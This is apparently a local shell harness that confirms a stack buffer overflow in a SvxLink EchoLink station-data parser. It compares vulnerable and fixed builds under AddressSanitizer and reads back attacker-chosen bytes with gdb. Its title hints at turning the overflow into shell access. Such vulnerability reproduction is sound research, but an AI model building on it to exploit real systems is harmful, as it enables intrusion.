#!/bin/sh
# Local only: build vuln/fixed x ASan/plain from pinned sources and assert
# the source-bound stack overflow, its attacker offset and the clamp control.
set -u
cd "$(dirname "$0")"
mkdir -p runs evidence
if ! python3 gen_driver.py; then echo "PIN_DRIFT: abort"; exit 2; fi

CXX=${CXX:-g++}
BASE="-std=c++11 -O0 -g -fno-omit-frame-pointer -fno-stack-protector"
PASS=0
FAIL=0
ok()   { PASS=$((PASS+1)); printf 'PASS %s\n' "$1"; }
bad()  { FAIL=$((FAIL+1)); printf 'FAIL %s: %s\n' "$1" "$2"; }

for variant in vuln fixed; do
  for mode in asan plain; do
    flags="$BASE"
    [ "$mode" = asan ] && flags="$flags -fsanitize=address"
    $CXX $flags "harness/driver-$variant.cpp" -o "runs/$variant-$mode" \
      >"evidence/build-$variant-$mode.log" 2>&1 \
      && ok "BUILD_${variant}_${mode}" || bad "BUILD_${variant}_${mode}" "compiler"
  done
done

# ASan: vulnerable writes 120 chosen bytes into the 45-byte str at :217 and
# a NUL at the attacker-chosen offset at :218.
set +e
ASAN_OPTIONS=detect_leaks=0 ./runs/vuln-asan 120 >evidence/vuln-asan-120.out 2>&1
rc=$?
set -e
if [ "$rc" -ne 0 ] && grep -q 'stack-buffer-overflow' evidence/vuln-asan-120.out \
   && grep -q 'EchoLinkStationData.cpp:217' evidence/vuln-asan-120.out; then
  ok ASAN_VULN_WRITE_120
else
  bad ASAN_VULN_WRITE_120 "rc=$rc"
fi

set +e
ASAN_OPTIONS=detect_leaks=0 ./runs/vuln-asan 45 >evidence/vuln-asan-45.out 2>&1
rc=$?
set -e
if [ "$rc" -ne 0 ] && grep -q 'stack-buffer-overflow' evidence/vuln-asan-45.out \
   && grep -q 'EchoLinkStationData.cpp:218' evidence/vuln-asan-45.out; then
  ok ASAN_VULN_NULL_45
else
  bad ASAN_VULN_NULL_45 "rc=$rc"
fi

for n in 44 31; do
  set +e
  ASAN_OPTIONS=detect_leaks=0 ./runs/vuln-asan "$n" >"evidence/vuln-asan-safe-$n.out" 2>&1
  rc=$?
  set -e
  if [ "$rc" -eq 0 ] && grep -q "SETTLED len=$n" "evidence/vuln-asan-safe-$n.out"; then
    ok "ASAN_VULN_SAFE_$n"
  else
    bad "ASAN_VULN_SAFE_$n" "rc=$rc"
  fi
done

for n in 44 45 120 4096; do
  set +e
  ASAN_OPTIONS=detect_leaks=0 ./runs/fixed-asan "$n" >"evidence/fixed-asan-$n.out" 2>&1
  rc=$?
  set -e
  if [ "$rc" -eq 0 ] && grep -q "SETTLED len=$n" "evidence/fixed-asan-$n.out"; then
    ok "ASAN_FIXED_$n"
  else
    bad "ASAN_FIXED_$n" "rc=$rc"
  fi
done

set +e
./runs/vuln-plain 120 >evidence/vuln-plain-120.out 2>&1
rc=$?
set -e
[ "$rc" -ne 0 ] && ok PLAIN_VULN_120 || bad PLAIN_VULN_120 "rc=$rc"

for spec in "vuln-plain 44" "fixed-plain 44" "fixed-plain 120" "fixed-plain 4096"; do
  set -- $spec
  set +e
  ./runs/"$1" "$2" >"evidence/$1-$2.out" 2>&1
  rc=$?
  set -e
  [ "$rc" -eq 0 ] && ok "PLAIN_CLEAN_${1}_$2" || bad "PLAIN_CLEAN_${1}_$2" "rc=$rc"
done

# Read-only stack readback at the source line after the pinned sink: chosen
# 0x41 bytes past str[45] in the unprotected vulnerable build.
if command -v gdb >/dev/null 2>&1 && [ -f harness/readback.gdb ]; then
  gdb -q -batch -x harness/readback.gdb ./runs/vuln-plain \
    >evidence/gdb-readback.out 2>&1
  if grep -q 'CHOSEN_READBACK 41414141414141414141414141414141' evidence/gdb-readback.out; then
    ok GDB_CHOSEN_BYTES
  else
    bad GDB_CHOSEN_BYTES "readback mismatch"
  fi
else
  printf 'SKIP GDB_CHOSEN_BYTES\n'
fi

{
  printf 'svxlinkdirectory2shell run-all\n'
  printf 'PASS=%s FAIL=%s\n' "$PASS" "$FAIL"
  for f in evidence/*.out; do
    # Hash only stable tokens: PIDs and ASan/GDB addresses vary per run.
    { printf '%s ' "$f"
      awk '/ERROR: AddressSanitizer/{print "ASAN", $3}
           /WRITE of size/{print "WRITE", $4}
           /SETTLED/{print "SETTLED", $2, $3}
           /CHOSEN_READBACK/{print "CHOSEN", $2}
           /Program received/{print "SIGNAL", $4}' "$f"
    } | sha256sum | awk -v n="$f" '{print $1, n}'
  done
} | tee runs/summary.txt

[ "$FAIL" -eq 0 ] || exit 1
printf 'RUN_ALL_OK %s PASS / %s FAIL\n' "$PASS" "$FAIL"
